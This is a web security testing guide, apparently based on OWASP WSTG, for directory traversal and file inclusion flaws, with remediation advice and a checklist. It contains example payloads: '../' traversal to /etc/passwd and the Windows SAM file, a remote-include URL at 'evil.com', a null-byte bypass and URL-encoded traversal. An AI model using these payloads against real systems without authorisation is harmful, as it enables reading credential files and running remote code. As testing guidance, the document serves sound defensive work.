# OWASP WSTG v4.0 - WSTG-ATHZ-01

## Test Name: Testing Directory Traversal File Include

### Overview
This test identifies vulnerabilities in directory traversal or file inclusion mechanisms that allow attackers to access unauthorized directories, files, or code.

---

### Objectives
- Identify vulnerabilities that allow unauthorized access to files on the server.
- Detect insecure implementations of file handling and path resolution.
- Ensure input validation and sanitization for file paths and includes.

---

### Test Steps

#### 1. **Test for Directory Traversal**
   - **Scenario**: Attempt to access restricted files by exploiting directory traversal.
   - **Steps**:
     1. Identify input fields, parameters, or endpoints that handle file paths.
     2. Attempt to include directory traversal patterns such as `../` or `..\` in inputs.
     3. Test for access to sensitive files like `/etc/passwd` or `C:\Windows\System32\config\sam`.
   - **Indicators**:
     - Successful access to restricted directories or files.
     - Error messages exposing server paths or details.

#### 2. **Inspect File Inclusion Mechanisms**
   - **Scenario**: Verify if file inclusion is vulnerable to attacks.
   - **Steps**:
     1. Identify functionality that dynamically includes files (e.g., templates).
     2. Test with local file inclusion (LFI) payloads (e.g., `../../file.php`).
     3. Test with remote file inclusion (RFI) payloads (e.g., `http://evil.com/malicious.php`).
   - **Indicators**:
     - Successful inclusion of unintended files.
     - Execution of remote code from external URLs.

#### 3. **Test Null Byte Injection**
   - **Scenario**: Check if null byte injection bypasses file extension restrictions.
   - **Steps**:
     1. Use null byte characters (`%00`) in file path inputs.
     2. Append additional file extensions to test inclusion (e.g., `/etc/passwd%00.jpg`).
   - **Indicators**:
     - Files are incorrectly included despite extension restrictions.
     - Null byte injections bypass security checks.

#### 4. **Analyze Error Handling**
   - **Scenario**: Review how the application handles invalid file path requests.
   - **Steps**:
     1. Enter invalid or malformed file paths.
     2. Observe error messages and responses.
   - **Indicators**:
     - Detailed error messages disclose server-side file structures or configurations.

#### 5. **Check for Encoding Bypass Techniques**
   - **Scenario**: Test for encoding or obfuscation techniques that bypass filters.
   - **Steps**:
     1. Use URL encoding (e.g., `%2E%2E%2F` for `../`) in file path inputs.
     2. Test double encoding or alternate encodings.
   - **Indicators**:
     - Filters fail to detect traversal patterns when encoded.

---

### Tools
- **Burp Suite**: Intercept and modify requests.
- **OWASP ZAP**: Automated scans for directory traversal.
- **Fiddler**: Debug and inspect HTTP requests.
- **Nikto**: Scan for known vulnerabilities including file inclusion.
- **Metasploit**: Test advanced exploitation scenarios.

---

### Remediation
- Validate and sanitize all user inputs for file paths.
- Use server-side mechanisms to enforce allowed file paths.
- Disable dynamic file includes if not necessary.
- Implement proper error handling that avoids exposing server information.
- Restrict file access to necessary directories only using `chroot` or equivalent.
- Regularly test and audit file inclusion and directory traversal mechanisms.

---

### References
- [OWASP Testing Guide v4.0: Directory Traversal File Include](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Path Traversal Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html)
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)

---

### Checklist
- [ ] Input validation and sanitization are implemented for file paths.
- [ ] Dynamic file inclusion mechanisms are secured or disabled.
- [ ] Proper error handling avoids exposing server information.
- [ ] Restricted directories and files are inaccessible.
- [ ] Encoding bypass techniques are mitigated.
